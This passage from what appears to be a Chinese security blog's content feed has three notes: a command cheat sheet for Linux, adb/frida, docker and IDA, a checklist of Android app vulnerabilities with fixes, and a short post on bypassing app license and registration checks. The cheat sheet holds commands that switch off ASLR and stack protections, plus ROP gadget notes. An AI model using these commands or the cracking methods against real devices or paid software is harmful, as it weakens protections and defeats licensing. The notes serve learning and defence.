crc) &#123;<br>    beModified = <span class="hljs-keyword">true</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>beModified = <span class="hljs-keyword">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> beModified;<br>    &#125;    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用命令记录</title>
    <link href="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-Mac命令记录"><a href="#Linux-Mac命令记录" class="headerlink" title="Linux/Mac命令记录"></a>Linux/Mac命令记录</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo xxxxx &gt; xx.txt 会自动换行<br>echo -n xxxxx &gt; xx.txt 不会换行<br><br>sudo passwd root <span class="hljs-regexp">//</span>更改root密码<br><br><span class="hljs-regexp">//</span>链接<br>$ sudo rm -rf python<br>$ sudo ln -s <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3  /u</span>sr<span class="hljs-regexp">/bin/</span>python<br><span class="hljs-regexp">//</span>换内核程序<br>sudo apt-get install synaptic<br><span class="hljs-regexp">//</span>重启桌面<br>sudo <span class="hljs-regexp">/etc/i</span>nit.d/gdm restart<br><span class="hljs-regexp">//</span>关闭ASLR<br>echo <span class="hljs-number">0</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space<br><br>NX：-z execstack <span class="hljs-regexp">/ -z noexecstack (关闭 /</span> 开启)    不让执行栈上的数据，于是JMP ESP就不能用了<br>Canary：-fno-stack-protector <span class="hljs-regexp">/-fstack-protector /</span> -fstack-protector-all (关闭 <span class="hljs-regexp">/ 开启 /</span> 全开启)  栈里插入cookie信息<br>PIE：-no-pie <span class="hljs-regexp">/ -pie (关闭 /</span> 开启)   地址随机化，另外打开后会有get_pc_thunk<br>RELRO：-z norelro <span class="hljs-regexp">/ -z lazy /</span> -z now (关闭 <span class="hljs-regexp">/ 部分开启 /</span> 完全开启)  对GOT表具有写权限<br>gcc -z execstack -fno-stack-protector -no-pie -z norelro<br><span class="hljs-regexp">//</span>linux命令，将指定程序在指定端口运行：<br>socat tcp-listen:<span class="hljs-number">10001</span>,reuseaddr,fork EXEC:./file_name,pty,raw,echo=<span class="hljs-number">0</span><br><br><span class="hljs-regexp">//</span>在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样）<br><br>特殊的gadgets:<br>通常位于x64的ELF程序中的__libc_csu_init,<br>universal_gadget1 = <span class="hljs-number">0</span>x40075a           <span class="hljs-comment">#万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span><br>universal_gadget2 = <span class="hljs-number">0</span>x400740        <span class="hljs-comment">#万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</span><br><br>xattr -d -r com.apple.quarantine ./*<br></code></pre></td></tr></table></figure><h1 id="ABD-frida命令"><a href="#ABD-frida命令" class="headerlink" title="ABD/frida命令"></a>ABD/frida命令</h1><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tcl">adb tcpip <span class="hljs-number">5555</span><br>adb connect xxxxx:<span class="hljs-number">5555</span><br>强制运行<span class="hljs-number">32</span>位模式：adb install --abi armeabi-v7a xxxx.apk<br><br>cat /<span class="hljs-keyword">proc</span>/cpuinfo #Android查看cpu架构<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> am</span> start -D -n<span class="hljs-title"> com.iscclockk/.MainActivity</span><br>jdb附加<span class="hljs-title"> jdb</span> -connect<span class="hljs-title"> com.sun.jdi.SocketAttach:hostname=localhost,port=8700</span><br><span class="hljs-title"></span><br><span class="hljs-title">setenforce</span> 0<br>设置全局调试：<span class="hljs-title"></span><br><span class="hljs-title">magisk</span> resetprop<span class="hljs-title"> ro.debuggable</span> 1<span class="hljs-title"></span><br><span class="hljs-title">stop;start;</span><br><span class="hljs-title"></span><br><span class="hljs-title">frida非标准端口连接:</span><br>./frida-server -l 0.0.0.0:6666<span class="hljs-title"></span><br><span class="hljs-title">frida-ps</span> -H 192.168.1.102:6666<span class="hljs-title"></span><br><span class="hljs-title">objection</span> -p 6666<br>以调试模式启动：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> am</span> set-debug-app -w<span class="hljs-title"> com.d3ctf.noname</span><br>查看android是32还是64：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> getprop</span> ro.product.cpu.abi<br>查看app最前台进程：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> dumpsys</span> window |<span class="hljs-title"> grep</span> mCurrentFocus<span class="hljs-title"></span><br><span class="hljs-title">frida</span> -U -f<span class="hljs-title"> cn.ticktick.task</span> -l 202012lesson6.js --no-pause<br></code></pre></td></tr></table></figure><p><img src="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20210811001815387.png" alt="image-20210811001815387"></p><h1 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>导入镜像：docker import - ubuntu/<span class="hljs-number">17.04</span>.amd64<br><span class="hljs-regexp">//</span>运行镜像：docker run -it -p <span class="hljs-number">23946</span>:<span class="hljs-number">23946</span> ubuntu<span class="hljs-regexp">/17.04.amd64 /</span>bin/bash<br>  会创建一个docker容器，第一个端口是宿主机的端口，第二个是容器的端口<br><span class="hljs-regexp">//</span>列出容器：docker container ls -a<br><span class="hljs-regexp">//</span>容器重命名：docker container rename old_name new_name<br><span class="hljs-regexp">//</span>打开容器的shell：docker exec -it container_name <span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">//</span>启动容器：docker start container_name<br><span class="hljs-regexp">//</span>复制：docker container cp file_name container_name:/root<br><br><span class="hljs-regexp">//</span>导入镜像<br>docker load -i nginx.tar<br><span class="hljs-regexp">//</span>导出镜像<br>docker save -o nginx.tar nginx:latest<br></code></pre></td></tr></table></figure><h1 id="IDA常用"><a href="#IDA常用" class="headerlink" title="IDA常用"></a>IDA常用</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sub_</span> 指令和子函数起点<br><span class="hljs-attribute">locret_</span> 返回指令 <br><span class="hljs-attribute">loc_</span> 指令<br><span class="hljs-attribute">off_</span> 数据，包含偏移量<br><span class="hljs-attribute">seg_</span> 数据，包含段地址值<br><span class="hljs-attribute">asc_</span> 数据，ASCII字符串<br><span class="hljs-attribute">byte_</span> 数据，字节（或字节数组）<br><span class="hljs-attribute">word_</span> 数据，<span class="hljs-number">16</span>位数据（或字数组）<br><span class="hljs-attribute">dword_</span> 数据，<span class="hljs-number">32</span>位数据（或双字数组）<br><span class="hljs-attribute">qword_</span> 数据，<span class="hljs-number">64</span>位数据（或<span class="hljs-number">4</span>字数组）<br><span class="hljs-attribute">flt_</span> 浮点数据，<span class="hljs-number">32</span>位（或浮点数组）<br><span class="hljs-attribute">dbl_</span> 浮点数，<span class="hljs-number">64</span>位（或双精度数组）<br><span class="hljs-attribute">tbyte_</span> 浮点数，<span class="hljs-number">80</span>位（或扩展精度浮点数）<br><span class="hljs-attribute">stru_</span> 结构体(或结构体数组)<br><span class="hljs-attribute">algn_</span> 对齐指示<br><span class="hljs-attribute">unk_</span> 未处理字节<br></code></pre></td></tr></table></figure><p><img src="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20210822014801811.png" alt="image-20210822014801811"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Android漏洞挖掘</title>
    <link href="/2020/03/15/Android%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2020/03/15/Android%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<p>菜鸡准备开始尝试挖洞了。学习文章：<a href="https://www.zhihu.com/question/22933619">https://www.zhihu.com/question/22933619</a></p><h1 id="AndroidManifest配置相关的详情或漏洞"><a href="#AndroidManifest配置相关的详情或漏洞" class="headerlink" title="AndroidManifest配置相关的详情或漏洞"></a>AndroidManifest配置相关的详情或漏洞</h1><h2 id="程序被任意调试"><a href="#程序被任意调试" class="headerlink" title="程序被任意调试"></a>程序被任意调试</h2><p>详情：AndroidManifest.xml中android:debuggable=”true”。</p><p>危害：导致app可以被任意调试</p><p>建议：将true改为false即可。</p><h2 id="程序数据任意备份"><a href="#程序数据任意备份" class="headerlink" title="程序数据任意备份"></a>程序数据任意备份</h2><p>详情：AndroidManifest.xml中android:allowBackup=”true”。</p><p>危害：导致app应用数据可以被备份导出。</p><p>建议：将true改为false即可。</p><p>组件暴露：建议使用android:protectionLevel=”signature”验证调用来源。</p><h2 id="Activity组件暴露"><a href="#Activity组件暴露" class="headerlink" title="Activity组件暴露"></a>Activity组件暴露</h2><p>详情：Activity组件的exported被设置为true，或者未设置exported同时IntentFilter不为空时，可通过设置intent唤起activity。</p><p>危害：构造恶意数据对导出的activity进行越权攻击。</p><p>建议：exported设置为false，对组件进行权限控制和参数校验</p><h2 id="Service组件暴露"><a href="#Service组件暴露" class="headerlink" title="Service组件暴露"></a>Service组件暴露</h2><p>同Activity组件暴露相同。</p><h2 id="ContentProvider组件暴露"><a href="#ContentProvider组件暴露" class="headerlink" title="ContentProvider组件暴露"></a>ContentProvider组件暴露</h2><p>详情：exported为true或者api小于等于16.</p><p>危害：访问不公开共享的数据或文件。</p><p>建议：同上。</p><h2 id="BroadcastReceiver组件暴露"><a href="#BroadcastReceiver组件暴露" class="headerlink" title="BroadcastReceiver组件暴露"></a>BroadcastReceiver组件暴露</h2><p>同上。</p><h2 id="Intent-Scheme-URLs攻击"><a href="#Intent-Scheme-URLs攻击" class="headerlink" title="Intent Scheme URLs攻击"></a>Intent Scheme URLs攻击</h2><p>详情：在AndroidManifest.xml设置Scheme协议之后，可以通过浏览器打开对应的Activity。</p><p>危害：通过访问浏览器构造Intent语法唤醒app相应组件，可能导致拒绝服务甚至越权调用以及提权漏洞。</p><p>建议：对数据进行安全检查，配置category filter,添加android.intent.category.BROWSABLE方式规避风险。</p><h1 id="WebView组件及服务器通信相关的风险或漏洞"><a href="#WebView组件及服务器通信相关的风险或漏洞" class="headerlink" title="WebView组件及服务器通信相关的风险或漏洞"></a>WebView组件及服务器通信相关的风险或漏洞</h1><h2 id="webview存在本地Java接口"><a href="#webview存在本地Java接口" class="headerlink" title="webview存在本地Java接口"></a>webview存在本地Java接口</h2><p>详情：android的webview组件有一个非常特殊接口函数addJavascriptInterface，能实现本地java与js之间交互。</p><p>危害：targetSdkVersion小于17时，利用此接口可以远程执行任意代码。</p><p>建议：不使用此接口，使用注入javascript和第三方协议的替代方案。</p><h2 id="WebView组件远程代码执行（调用getClassLoader）"><a href="#WebView组件远程代码执行（调用getClassLoader）" class="headerlink" title="WebView组件远程代码执行（调用getClassLoader）"></a>WebView组件远程代码执行（调用getClassLoader）</h2><p>详情：targetSdkVersion小于17时，并在Context子类中使用addJavascriptInterface绑定this对象。</p><p>危害：通过调用getClassLoader绕过getClass方法的限制。</p><p>建议：targetSdkVersion大于17。</p><h2 id="WebView忽略SSL证书错误"><a href="#WebView忽略SSL证书错误" class="headerlink" title="WebView忽略SSL证书错误"></a>WebView忽略SSL证书错误</h2><p>详情：WebView调用onReceivedSslError方法时，直接执行handler.proceed()来忽略该证书错误。</p><p>危害：可能引起中间人攻击。</p><p>建议：不要重写onReceivedSslError方法，或者对错误进行业务判断。</p><h2 id="WebView启用访问文件数据"><a href="#WebView启用访问文件数据" class="headerlink" title="WebView启用访问文件数据"></a>WebView启用访问文件数据</h2><p>详情：setAllowFileAccess(true),可通过webview访问私有目录下的文件数据。</p><p>危害：此方法默认为true，绕过同源策略能够对私有目录文件进行访问，导致隐私泄漏。</p><p>建议：设置为false，禁止访问私有文件数据。</p><h2 id="SSL通信服务端-客户端检测信任任意证书"><a href="#SSL通信服务端-客户端检测信任任意证书" class="headerlink" title="SSL通信服务端/客户端检测信任任意证书"></a>SSL通信服务端/客户端检测信任任意证书</h2><p>详情：自定义SSL x509 TrustManager，重写checkServerTrusted/checkClientTrusted方法，方法内不做任何服务端的证书校验。</p><p>危害：中间人攻击。</p><p>建议：双端进行严格证书校验。</p><h2 id="HTTPS关闭主机名验证"><a href="#HTTPS关闭主机名验证" class="headerlink" title="HTTPS关闭主机名验证"></a>HTTPS关闭主机名验证</h2><p>详情：构造HttpCLient时，HostnameVerifier参数为ALLOW_ALL_HOSTNAME_VERIFIER或空。</p><p>危害：中间人攻击。</p><p>建议：加密通信被还原为明文通信。</p><h2 id="开放socket端口"><a href="#开放socket端口" class="headerlink" title="开放socket端口"></a>开放socket端口</h2><p>详情：App绑定端口进行监听，建立连接后可接收外部发送的数据。</p><p>危害：构造恶意数据对端口进行测试，对于绑定了0.0.0.0的app可发起远程攻击。</p><p>建议：绑定127.0.0.1，对接受数据进行校验检测。</p><h1 id="数据安全风险"><a href="#数据安全风险" class="headerlink" title="数据安全风险"></a>数据安全风险</h1><h2 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h2><h3 id="SD卡数据被第三方程序访问"><a href="#SD卡数据被第三方程序访问" class="headerlink" title="SD卡数据被第三方程序访问"></a>SD卡数据被第三方程序访问</h3><p>详情：存储在SD卡中的内容可以调用getExternalStorageDirectory访问。</p><p>建议：存储信息到私有目录，对敏感数据加密。</p><h3 id="全局File可读写漏洞-openFileOutput"><a href="#全局File可读写漏洞-openFileOutput" class="headerlink" title="全局File可读写漏洞-openFileOutput"></a>全局File可读写漏洞-openFileOutput</h3><p>详情：openFileOutput方法创建内部文件时，将文件设置了全局的可读权限MODE_WORLD_READABLE/MODE_WORLD_WRITEABLE。。</p><p>危害：恶意读取文件内容。</p><p>建议：确认是否存在敏感数据，删除全局可读/写属性。</p><h2 id="私有文件泄漏风险-getSharedPreferences"><a href="#私有文件泄漏风险-getSharedPreferences" class="headerlink" title="私有文件泄漏风险-getSharedPreferences"></a>私有文件泄漏风险-getSharedPreferences</h2><h3 id="配置文件可读可写"><a href="#配置文件可读可写" class="headerlink" title="配置文件可读可写"></a>配置文件可读可写</h3><p>详情：getSharedPreferences第二个参数为MODE_WORLD_READABLE 或MODE_WORLD_WRITEABLE。</p><p>危害：信息泄漏，篡改内容，影响程序正常运行。</p><p>建议：参数设置MODE_PRIVATE。禁止使用MODE_WORLD_READABLE ｜MODE_WORLD_WRITEABLE模式。</p><h2 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h2><h3 id="AES弱加密"><a href="#AES弱加密" class="headerlink" title="AES弱加密"></a>AES弱加密</h3><p>详情：使用“AES/ECB/NoPadding”或“AES/ECB/PKCS5padding”的模式。</p><p>危害：破解难度低。</p><p>建议：使用cbc或cfb加密模式。</p><h3 id="随机数不安全使用"><a href="#随机数不安全使用" class="headerlink" title="随机数不安全使用"></a>随机数不安全使用</h3><p>详情：调用SecureRandom类中的setSeed方法。</p><p>危害：生成的随机数具有确定性，存在被破解的可能性。</p><p>建议：使用/dev/urandom或/dev/random来初始化伪随机数生成器。</p><h3 id="AES-DES硬编码密钥"><a href="#AES-DES硬编码密钥" class="headerlink" title="AES/DES硬编码密钥"></a>AES/DES硬编码密钥</h3><p>详情：加密时采用硬编码在程序中。</p><p>危害：通过反编译获取密钥可以轻易揭秘APP通信数据。</p><p>建议：密钥加密存储或进行加解密运算。</p><h1 id="文件目录遍历类漏洞"><a href="#文件目录遍历类漏洞" class="headerlink" title="文件目录遍历类漏洞"></a>文件目录遍历类漏洞</h1><h2 id="Provider文件目录遍历"><a href="#Provider文件目录遍历" class="headerlink" title="Provider文件目录遍历"></a>Provider文件目录遍历</h2><p>详情：Provider被导出并且覆写了openFile方法，没有对Content Query Uri进行有效判断或过滤。</p><p>危害：利用openFile接口进行文件目录遍历，可达到访问任意可读文件的目的。</p><p>建议：不覆写openFile方法，对参数进行安全校验。</p><h2 id="unzip解压缩漏洞"><a href="#unzip解压缩漏洞" class="headerlink" title="unzip解压缩漏洞"></a>unzip解压缩漏洞</h2><p>详情：解压zip，使用getName获取压缩文件名后未进行校验。</p><p>危害：构造恶意zip文件，覆盖相应的的文件导致任意代码执行。</p><p>建议：解压文件时，判断是否有../特殊字符。</p><h1 id="文件格式解析类漏洞"><a href="#文件格式解析类漏洞" class="headerlink" title="文件格式解析类漏洞"></a>文件格式解析类漏洞</h1><h2 id="FFmpeg文件读取"><a href="#FFmpeg文件读取" class="headerlink" title="FFmpeg文件读取"></a>FFmpeg文件读取</h2><p>详情：使用了低版本的FFmpeg库进行视频解码。</p><p>危害：低版本可能存在本地文件读取漏洞，可以通过构造恶意文件获取本地文件内容。</p><p>建议：升级最新版。</p><h2 id="安卓“Janus”漏洞"><a href="#安卓“Janus”漏洞" class="headerlink" title="安卓“Janus”漏洞"></a>安卓“Janus”漏洞</h2><p>详情：在原始apk前部添加一个恶意的classes.dex文件（A文件），安卓系统在校验时计算了A文件的hash值，并以“classes.dex”为字符串作为key保存，然后计算原本的classes.dex（B文件），同样的key保存，之后将会覆盖A文件的hash值，系统认为apk没有被修改，完成安装，运行apk会优先执行文件A，忽略B。</p><p>危害：绕过安卓系统的signature scheme V1签名机制，进而直接对App进行篡改。</p><p>建议：禁止安装多个同名apk文件。</p><h1 id="内存堆栈类漏洞"><a href="#内存堆栈类漏洞" class="headerlink" title="内存堆栈类漏洞"></a>内存堆栈类漏洞</h1><h2 id="未使用编译器堆栈保护技术"><a href="#未使用编译器堆栈保护技术" class="headerlink" title="未使用编译器堆栈保护技术"></a>未使用编译器堆栈保护技术</h2><p>详情：stack canaries漏洞缓解技术，函数调用时，向栈帧内压入额外的canary随机数，栈溢出时，canary先被覆盖，之后才是ebp和返回地址。函数返回时，会将canary与.data副本的值进行比较，不相同，说明发生了栈溢出。</p><p>危害：发生栈溢出时系统不会对程序进行保护。</p><p>建议：使用NDK编译so时，在Android.mk文件中添加：LOCAL_CFLAGS := -Wall -O2 -U_FORTIFY_SOURCE -fstack-protector-all</p><h2 id="未使用地址空间随机化技术"><a href="#未使用地址空间随机化技术" class="headerlink" title="未使用地址空间随机化技术"></a>未使用地址空间随机化技术</h2><p>详情：PIE，地址随机分配。</p><p>危害：shellcode执行难度降低，攻击成功率增加。</p><p>建议：NDK编译so时，加入LOCAL_CFLAGS := -fpie -pie开启对PIE的支持。</p><h2 id="libupnp栈溢出漏洞"><a href="#libupnp栈溢出漏洞" class="headerlink" title="libupnp栈溢出漏洞"></a>libupnp栈溢出漏洞</h2><p>详情：使用了低于1.6.18版本的libupnp库文件。</p><p>危害：代码执行。</p><p>建议：升级库到1.6.18版本或以上。</p><h1 id="动态类漏洞"><a href="#动态类漏洞" class="headerlink" title="动态类漏洞"></a>动态类漏洞</h1><h2 id="DEX文件动态加载"><a href="#DEX文件动态加载" class="headerlink" title="DEX文件动态加载"></a>DEX文件动态加载</h2><p>详情：使用DEXClassLoader加载外部apk，dex等文件，外部文件无法控制时，无法保证加载的文件是否安全。</p><p>危害：加载恶意dex文件会导致任意命令的执行。</p><p>建议：加载外部文件前，必须使用校验签名或MD5等方式确认外部文件的安全性。</p><h2 id="动态注册广播"><a href="#动态注册广播" class="headerlink" title="动态注册广播"></a>动态注册广播</h2><p>详情：使用registerReceiver动态注册的广播在组件的生命周期里是默认导出的。</p><p>危害：拒绝服务、数据泄露、越权调用。</p><p>建议：使用带权限检验的registerReceiver API进行动态广播的注册。</p><h1 id="校验或限定不严导致的风险或漏洞"><a href="#校验或限定不严导致的风险或漏洞" class="headerlink" title="校验或限定不严导致的风险或漏洞"></a>校验或限定不严导致的风险或漏洞</h1><h2 id="Fragment注入"><a href="#Fragment注入" class="headerlink" title="Fragment注入"></a>Fragment注入</h2><p>详情：通过导出的PreferenceActivity的子类，没有正确处理intent的extra值。</p><p>危害：攻击者可绕过限制访问未授权页面。</p><p>建议：使用isValidFragment方法中进行fragment名的合法性校验。</p><h2 id="隐式意图调用"><a href="#隐式意图调用" class="headerlink" title="隐式意图调用"></a>隐式意图调用</h2><p>详情：封装Intent时采用隐式设置，只设定action，未限定具体的接受对象，导致intent可被其他应用获取并读取其中的数据。</p><p>危害：Intent被第三方劫持，导致内部隐私数据泄漏。</p><p>建议：改为显示调用。</p><h1 id="命令行调用类相关的风险或漏洞"><a href="#命令行调用类相关的风险或漏洞" class="headerlink" title="命令行调用类相关的风险或漏洞"></a>命令行调用类相关的风险或漏洞</h1><h2 id="动态链接库中包含执行命令的函数"><a href="#动态链接库中包含执行命令的函数" class="headerlink" title="动态链接库中包含执行命令的函数"></a>动态链接库中包含执行命令的函数</h2><p>详情：native程序，执行系统命令时，对接收的参数执行命令时没有做过滤或检验。</p><p>危害：攻击者传入任意命令，导致命令执行。</p><p>建议：对参数进行严格过滤。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h2 id="应用反编译"><a href="#应用反编译" class="headerlink" title="应用反编译"></a>应用反编译</h2><p><strong>漏洞</strong>：APK 包非常容易被反编译成可读文件，稍加修改就能重新打包成新的 APK。<br><strong>利用</strong>：软件破解，内购破解，软件逻辑修改，插入恶意代码，替换广告商 ID。<br><strong>建议</strong>：使用 ProGuard 等工具混淆代码，重要逻辑用 NDK 实现。<br><strong>例子</strong>：反编译重打包 FlappyBird，把广告商 ID 换了，游戏改加插一段恶意代码等等。</p><h2 id="数据的存储与传输"><a href="#数据的存储与传输" class="headerlink" title="数据的存储与传输"></a>数据的存储与传输</h2><p><strong>漏洞</strong>：外部存储（SD 卡）上的文件没有权限管理，所有应用都可读可写。开发者把敏感信息明文存在 SD 卡上，或者动态加载的 payload 放在 SD 卡上。<br><strong>利用</strong>：窃取敏感信息，篡改配置文件，修改 payload 逻辑并重打包。<br><strong>建议</strong>：不要把敏感信息放在外部存储上面；在动态加载外部资源的时候验证文件完整性。</p><p><strong>漏洞</strong>：使用全局可读写（MODE_WORLD_READABLE，MODE_WORLD_WRITEABLE）的内部存储方式，或明文存储敏感信息（用户账号密码等）。<br><strong>利用</strong>：全局读写敏感信息，或 root 后读取明文信息。<br><strong>建议</strong>：不适用全局可读写的内部存储方式，不明文存储用户账号密码。</p><h2 id="密码泄露"><a href="#密码泄露" class="headerlink" title="密码泄露"></a>密码泄露</h2><p><strong>漏洞</strong>：密码明文存储，传输。<br><strong>利用</strong>：</p><ul><li>root 后可读写内部存储。</li><li>SD 卡全局可读写。</li><li>公共 WiFi 抓包获取账号密码。</li></ul><p><strong>建议</strong>：实用成熟的加密方案。不要把密码明文存储在 SD 卡上。</p><h2 id="组件暴露-Activity-Service-Broadcast-Receiver-Content-Provider"><a href="#组件暴露-Activity-Service-Broadcast-Receiver-Content-Provider" class="headerlink" title="组件暴露 (Activity, Service, Broadcast Receiver, Content Provider)"></a>组件暴露 (Activity, Service, Broadcast Receiver, Content Provider)</h2><p><strong>漏洞</strong>：</p><ul><li>组件在被调用时未做验证。</li><li>在调用其他组件时未做验证。</li></ul><p><strong>利用</strong>：</p><ul><li>调用暴露的组件，达到某种效果，获取某些信息，构造某些数据。（比如：调用暴露的组件发短信、微博等）。</li><li>监听暴露组件，读取数据。</li></ul><p><strong>建议</strong>：验证输入信息、验证组件调用等。android:exported 设置为 false。使用 android:protectionLevel=”signature” 验证调用来源。</p><h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><p><strong>漏洞</strong>：</p><ul><li>恶意 App 可以注入 JavaScript 代码进入 WebView 中的网页，网页未作验证。</li><li>恶意网页可以执行 JavaScript 反过来调用 App 中注册过的方法，或者使用资源。</li></ul><p><strong>利用</strong>：</p><ul><li>恶意程序嵌入 Web App，然后窃取用户信息。</li><li>恶意网页远程调用 App 代码。更有甚者，通过 Java Reflection 调用 Runtime 执行任意代码。</li></ul><p><strong>建议</strong>：不使用 WebView 中的 setJavaScriptEnabled(true)，或者使用时对输入进行验证。</p><h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><ul><li>ROOT 后的手机可以修改 App 的内购，或者安装外挂 App 等。</li><li>Logcat 泄露用户敏感信息。</li><li>恶意的广告包。</li><li>利用 next Intent。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android 应用的漏洞大部分都是因为开发人员没有对输入信息做验证造成的，另外因为 Intent 这种特殊的机制，需要过滤外部的各种恶意行为。再加上 Android 应用市场混乱。所以现在 Android 应用的漏洞，恶意软件，钓鱼等还在不断增多。再加上 root 对于 App 沙箱的破坏，Android 升级的限制。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android软件的破解技术</title>
    <link href="/2020/03/14/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/"/>
    <url>/2020/03/14/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="授权key绕过"><a href="#授权key绕过" class="headerlink" title="授权key绕过"></a>授权key绕过</h2><p>一个apk通过另一个apk获取授权key即可解锁高级功能，两个apk共享资源需要指定<code>android:sharedUserId=&quot;xxx.xxx.xxx&quot;</code>相同。通过<code>creatPackageContext()</code>方法可以访问另一个apk的资源。</p><p>对于示例软件，可通过逆向算法、修改关键跳转等方法进行破解。</p><h2 id="序列号保护"><a href="#序列号保护" class="headerlink" title="序列号保护"></a>序列号保护</h2><p>通过注册码验证。</p><h2 id="网络验证"><a href="#网络验证" class="headerlink" title="网络验证"></a>网络验证</h2><p>静态网络验证通过得到服务器的反馈信息进行验证。</p><p>动态网络验证通过与服务器交互进行验证。</p><h2 id="In-app-Billing-应用内付费"><a href="#In-app-Billing-应用内付费" class="headerlink" title="In-app Billing (应用内付费)"></a>In-app Billing (应用内付费)</h2><p>跳过。</p><h2 id="Google-Play-License保护"><a href="#Google-Play-License保护" class="headerlink" title="Google Play License保护"></a>Google Play License保护</h2><p>跳过。</p><h2 id="重启验证"><a href="#重启验证" class="headerlink" title="重启验证"></a>重启验证</h2><p>第一次注册保存验证信息，再次开启程序时读取验证信息进行验证。保存信息有内部存储、外部存储、数据库存储、SharedProferences等4种方式。</p><h2 id="Mono-for-Android"><a href="#Mono-for-Android" class="headerlink" title="Mono for Android"></a>Mono for Android</h2><h2 id="Qt-for-Android"><a href="#Qt-for-Android" class="headerlink" title="Qt for Android"></a>Qt for Android</h2>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高校战役CTF部分writeup</title>
